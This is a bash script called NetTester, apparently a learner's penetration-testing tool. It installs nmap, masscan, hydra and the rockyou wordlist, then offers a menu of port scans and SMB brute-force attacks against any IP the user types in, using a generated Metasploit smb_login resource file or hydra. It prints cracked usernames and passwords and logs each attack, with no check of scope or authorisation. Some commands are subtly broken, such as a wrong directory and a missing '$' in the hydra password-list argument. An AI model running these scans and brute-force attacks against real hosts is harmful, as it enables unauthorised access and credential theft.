#!/bin/bash

########################
### NETTESTER FUNCTIONS
########################

# INSTALL(): automatically installs relevant applications and creates relevant directories
# CONSOLE(): collects user input to choose and execution option for network testing
# NMAP(): uses nmap to scan for open ports of a target address and execute LOG() 
# MASSCAN(): uses mascan to scan for open ports of a target address and execute LOG()
# MSF(): uses MSF console to brute-force via SMB on a target address and execute LOG()
# HYDRA(): uses hydra to brute-force via SMB on a target address and execute LOG()
# LOG(): saves log reports with date, time, IPs, attack type and used arguments for NMAP(), MASSCAN(), MSF(), or HYDRA(), after their execution

#####################
### INSTALL FUNCTION
#####################

### DEFINITION
function INSTALL()
{
        ### START
	# let the user know that NetTester is starting
	echo " "
	echo "[*] NetTester is starting..."
	echo " "
	echo "[*] Installing and updating applications on your local computer..."
	echo " "
	echo "[*] Creating new directory: ~/NetTester..."
	echo " "
	
	### APT UPDATE
	# update APT packages
	sudo apt-get -y update
	sudo apt-get -y upgrade
	sudo apt-get -y dist-upgrade
	
	### DIRECTORY
	# create a directory to contain output files later
	cd ~
	mkdir NetTester
	cd ~/NetTester
	echo "[+] Directory created: ~/NetTester"
	echo " "	
	# create a log file
	touch log.log
        echo "[+] Log created: ~/NetTester/log.log"
        
	# WORDLIST CONFIGURATION
	echo "[*] Configuring Wordlists..."
	sudo apt-get -y install wordlists
	cd /usr/share/wordlists
	sudo gunzip rockyou.txt.gz
	sudo cp rockyou.txt ~/NetTester/wordlist.txt
	cd ~/NetTester
	sudo sed -i '1i kali' wordlist.txt
	WordList=~/NetTester/wordlist.txt
	echo "[+] Wordlist created: ~/NetTester/wordlist.txt"
	echo " "
	cd ~/NetTester
	
  	### FIGLET INSTALLATION
	# install figlet for aesthetic purposes
	mkdir figrc
	cd ~/NetTester/figrc
	sudo apt-get -y install figlet
	# install cybermedium figlet font; credits: http://www.figlet.org
	wget http://www.jave.de/figlet/fonts/details/cybermedium.flf
	cd ~/NetTester
	
	### CORE APPLICATIONS INSTALLATION
	# install relevant applications
        sudo apt-get -y install nmap
	sudo apt-get -y install masscan
	sudo apt-get -y install hydra
        
	### END
	# let the user know applications are installed
	echo " "
	echo "[+] Applications installed and updated."
	echo "	"
}

### EXECUTION
# call the INSTALL function
INSTALL

#################
### LOG FUNCTION
#################

### DEFINITION

function LOG()
{ 
	### NMAP LOGGING
	# test if nmapoutput.txt exists
        cd ~/NetTester
	if [ -f ~/NetTester/nmapoutput.txt ]
	then
		# include date, time, IPs, attack type and used arguments in log
		DateTime="$(date +%F)_$(date +%X | awk '{print $1}')"
		AttackType="NmapPortScan"
		Arg="[sudo nmap -Pn $IP]"
		NumOpenPorts="$(cat nmapoutput.txt | grep open | wc -l)"
		# append filtered data into log.log
		echo "$DateTime $IP $AttackType $Arg [$NumOpenPorts Open Ports"] >> log.log
	fi
	
	### MASSCAN LOGGING
	# test if masscanoutput.txt exists
        cd ~/NetTester
	if [ -f ~/NetTester/masscanoutput.txt ]
	then
		# include date, time, IPs, attack type and used arguments in log
		DateTime="$(date +%F)_$(date +%X | awk '{print $1}')"
		AttackType="MasscanPortScan"
		Arg="[sudo masscan $IP -p'$Ports']"
		NumOpenPorts="$(cat masscanoutput.txt | grep open | wc -l)"
		# append filtered data into log.log
		echo "$DateTime $IP $AttackType $Arg [$NumOpenPorts Open Ports"] >> log.log
	fi
	
	### MSF LOGGING
	# test if msfoutput.txt exists
        cd ~/NetTester
	if [ -f ~/NetTester/msfoutput.txt ]
	then
		# include date, time, IPs, attack type and used arguments in log
		DateTime="$(date +%F)_$(date +%X | awk '{print $1}')"
		AttackType="MSFSMBBruteForceAttack"
		Arg="[sudo msfconsole -r msfscript.rc]"
		NumCrackedUsers="$(cat msfoutput.txt | grep Success: | wc -l)"
		# append filtered data into log.log
		echo "$DateTime $IP $AttackType $Arg [$NumCrackedUsers Cracked Users"] >> log.log
	fi
	
	# HYDRA LOGGING
	# test if hydraoutput.txt exists
        cd ~/NetTester
	if [ -f ~/NetTester/hydraoutput.txt ]
	then
		# include date, time, IPs, attack type and used arguments in log
		DateTime="$(date +%F)_$(date +%X | awk '{print $1}')"
		AttackType="HydraSMBBruteForceAttack"
		Arg="[sudo hydra -L $UserList -P $PassList $IP smb -vV]"
		NumCrackedUsers="$(cat hydraoutput.txt | grep host: | wc -l)"
		# append filtered data into log.log
		echo "$DateTime $IP $AttackType $Arg [$NumCrackedUsers Cracked Users]" >> log.log
	fi
}

##################
### NMAP FUNCTION
##################

### DEFINITION

function NMAP()
{ 
        ### START
        echo " "
        echo "NMAP PORT SCAN"
        echo " "
        echo "[!] Enter IP Address of Target Host:"
        read IP
        echo " "
        cd ~/NetTester
        
        ## SCANNING
        # execute scan with -Pn flag to avoid firewall 
        sudo nmap -Pn "$IP" > nmapoutput.txt
        
        ### LOGGING
        # call the LOG function to append elements of nmapoutput.txt into log.log
        LOG
        # let user know about the number and details of open ports 
        echo " "
        echo "$(cat nmapoutput.txt | grep open | wc -l) [+] OPEN PORTS:"
        echo "$(cat nmapoutput.txt | grep open | awk '{print $1}')"
        echo " "
        
        ### END
        # remove the nmapoutput.txt file after use
        rm nmapoutput.txt
        # let user know that the scan is done
        echo " "
        echo "[+] Nmap Port Scan has been executed and logged at ~/NetTester/log.log."
        echo " "
}

#####################
### MASSCAN FUNCTION
#####################

### DEFINITION

function MASSCAN()
{
        ### START
        echo " "
        echo "MASSCAN PORT SCAN"
        echo " "
        echo "[!] Enter IP Address of Target Host:"
        read IP
        echo " "
        echo "[!] Enter Port Numbers: (e.g. 445,80)"
        read Ports
        echo " "
        cd ~/NetTest
        
        ### SCANNING
        # execute scan with -Pn flag to avoid firewall
        sudo masscan "$IP" -p "$Ports" > masscanoutput.txt
        
        ### LOGGING
        # call the LOG function to append elements of masscanoutput.txt into log.log
        LOG
        # let user know about the number and details of open ports 
        echo " "
        echo "$(cat masscanoutput.txt | grep open | wc -l) [+] OPEN PORTS:"
        echo "$(cat masscanoutput.txt | grep open | awk '{print $4}')"
        echo " "
        
        ### END
        # remove the masscanpoutput.txt file after use
        rm masscanoutput.txt
        # let user know that the scan is done
        echo " "
        echo "[+] Masscan Port Scan has been executed and logged at ~/NetTester/log.log."
        echo " "
}

#################
### MSF FUNCTION
#################

### DEFINITION

function MSF()
{
        ### START
        echo " "
        echo "MSF SMB BRUTE-FORCE ATTACK"
        echo " "
        echo "[!] Enter IP Address of Target Host:"
        read IP
        echo " "
        cd ~/NetTester
        
        ### MSF CONSOLE RESOURCE FILE
        # create a .rc file to act as a script for msf console
        # inject then apend msfconsole commands
        echo "use auxiliary/scanner/smb/smb_login" > msfscript.rc
        echo "set rhosts $IP" >> msfscript.rc
        echo "set user_file $WordList" >> msfscript.rc
        echo "set pass_file $WordList" >> msfscript.rc
        echo "run" >> msfscript.rc
        echo "exit" >> msfscript.rc
        
        ### BRUTE FORCE ATTACK
        # execute attack utilising the .rc script 
        sudo msfconsole -r msfscript.rc -o msfoutput.txt
        
        ### LOGGING
        # call the LOG function to append elements of msfoutput.txt into netlog.log
        LOG
        # let user know about the number and details of cracked users
        echo " "
        echo "$(cat msfoutput.txt | grep Success: | wc -l) [+] CRACKED USERS: (Format: '.\<username>:<password>')"
        echo "$(cat msfoutput.txt | grep Success: | awk '{print $7}')"
        echo " "
        
        ### END
        # remove the msfscript.rc and msfoutput.txt files after use
        sudo chmod 777 msfscript.rc
        sudo rm msfscript.rc
        rm msfoutput.txt
        # let user know that the attack is done
        echo " "
        echo "[+] MSF SMB Brute-Force Attack has been executed and logged at ~/NetTester/log.log."
        echo " "
}

###################
### HYDRA FUNCTION
###################

### DEFINITION

function HYDRA()
{
        ### START
        echo " "
        echo "HYDRA SMB BRUTE-FORCE ATTACK"
        echo " "
        echo "[!] Enter IP Address of Target Host:"
        read IP
        echo " "
        cd ~/NetTester
        
        ### BRUTE FORCE ATTACK
        sudo hydra -f -L $WordList -P WordList $IP smb -t 4 -vV > hydraoutput.txt
        
        ### LOGGING
        # call the LOG function to append elements of hydraoutput.txt into netlog.log
        LOG
        # let user know about the number and details of cracked users
        echo " "
        echo "$(cat hydraoutput.txt | grep host: | wc -l) [+] CRACKED USERS: (Format: <username> <password>)"
        echo "$(cat hydraoutput.txt | grep host: | awk '{print $5 $7}')"
        echo " "
        
        ### END
        # remove the hydraoutput.txt files after use
        rm hydraoutput.txt
        # let user know that the attack is done
        echo " "
        echo "[+] Hydra SMB Brute-Force Attack has been executed and logged at ~/NetTester/log.log."
        echo " "
}

#####################
### CONSOLE FUNCTION
#####################

### DEFINITION

function CONSOLE()
{
	# read options for remote control
	read -p "[!] Select an option (A/B/C/D/E):
	
	A) Nmap Port Scan
	B) Masscan Port Scan
	C) MSF SMB Brute-Force Attack
	D) Hydra SMB Brute-Force Attack
	E) Exit
		
	" options
}

### EXECUTION

# call the CONSOLE function through while-true loop to return user to the console after every execution
while true 

do
# display figlet for aesthetics
figlet -c -f ~/NetTester/figrc/cybermedium.flf -t "NETTESTER"
echo " "
# call CONSOLE function
CONSOLE

### OPTIONS
case $options in

A) NMAP
;;

B) MASSCAN
;;

C) MSF
;;

D) HYDRA
;;

E) echo " "
echo "[*] Exiting NetTester..."
echo " "
exit
;;

esac

done
